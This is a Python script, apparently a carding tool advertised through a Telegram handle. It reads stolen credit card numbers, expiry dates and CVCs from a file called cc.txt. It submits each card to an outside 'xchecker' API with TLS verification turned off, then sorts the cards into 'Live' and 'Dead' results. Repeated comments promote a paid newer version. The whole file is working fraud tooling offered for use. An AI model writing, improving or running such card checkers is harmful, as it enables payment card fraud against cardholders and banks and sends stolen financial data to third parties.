import os
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 
# DEAD TOOL, DONT USE IT, BUY UNPATCHED LOL 

os.system('python -m pip install requests termcolor colorama urllib3 datetime')



import requests, time, urllib3
from datetime import datetime
from termcolor import colored
import colorama
from colorama import Fore



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print(Fore.RED + '  _      _  __ _   _                 _        _____ _     _    ')
print(Fore.LIGHTRED_EX + ' | |    (_)/ _| | (_)               ( )      / ____| |   | |   ')
print(Fore.RED + ' | |     _| |_| |_ _ _   _ _ __ ___ |/ ___  | |    | |__ | | __')
print(Fore.LIGHTRED_EX + ' | |    | |  _| __| | | | | `_ ` _ \  / __| | |    | `_ \ | |/ / ')
print(Fore.RED + ' | |____| | | | |_| | |_| | | | | | | \__ \ | |____| | | |   < ')
print(Fore.LIGHTRED_EX + ' |______|_|_|  \__|_|\__,_|_| |_| |_| |___/  \_____|_| |_|_|\_\ ')
print(Fore.LIGHTGREEN_EX + 'Created by t.me/liftium -> PAID LICENSE <$')                                                               
print(Fore.GREEN + 'Be sure your card file is called "cc.txt" ')          
time.sleep(3)                                                                
 

 
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾
# OLD API USE NEW - BUY HERE @liftium at telegram FOR 20$ 👾


ccFile = "cc.txt"
outputFile = "cc_checked_{}.txt".format(int(datetime.timestamp(datetime.now())))
xcheckerAPIURL = "https://www.xchecker.cc/api.php?cc={}|{}|{}|{}"
headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Accept": "*/*",
}
 
def writeFileOutput(data, file, mode="a"):
    f = open(file, mode)
    f.write("{}\n".format(data))
    f.close()
    if "|Live|" in data:
        print(colored(data, "green", attrs=["bold"]))
    elif "|Dead|" in data:
        print(colored(data, "red", attrs=["bold"]))
    else:
        print(colored(data, "white", attrs=["bold"]))
 
def main():
    if os.path.exists(ccFile):
        with open(ccFile) as f:
            writeFileOutput("----------------------------------------------", outputFile)
            for cc in f:
                cc = cc.replace("\r", "").replace("\n", "")
                try:
                    ccNumber = cc.split("|")[0]
                    expMonth = cc.split("|")[1]
                    expYear = cc.split("|")[2]
                    cvc = cc.split("|")[3]
                except:
                    writeFileOutput("{} => Format error. Use ccNumber|expMonth|expYear|cvc".format(cc), outputFile)
                    continue
                url = xcheckerAPIURL.format(ccNumber, expMonth, expYear, cvc)
                while True:
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    if response.status_code == 200 and "json" in response.headers["Content-Type"]:
                        data = response.json()
                        if "ccNumber" in data:
                            output = data["ccNumber"]
                            if "bankName" in data:
                                output += "|" + data["bankName"]
                            output += "|" + data["status"] + "|" + data["details"] + "THIS IS SHIT APIII BROO BUY NEW AT @LIFTIUM TELEGRAM ONLY 20 USD"
                        else:
                            output = "{} => {}".format(ccNumber, data["error"])
                        writeFileOutput(output + "THIS IS SHIT APIII BROO BUY NEW AT @LIFTIUM TELEGRAM ONLY 20 USD", outputFile)
                        break
                    else:
                        writeFileOutput("HTTP service error: {}, retry... THIS IS SHIT APIII BROO BUY NEW AT @LIFTIUM TELEGRAM ONLY 20 USD".format(response.status_code), outputFile)
                        time.sleep(1000)
    else:
        print("File {} not found in current directory".format(ccFile))
 
if __name__ == "__main__":
    main()
 



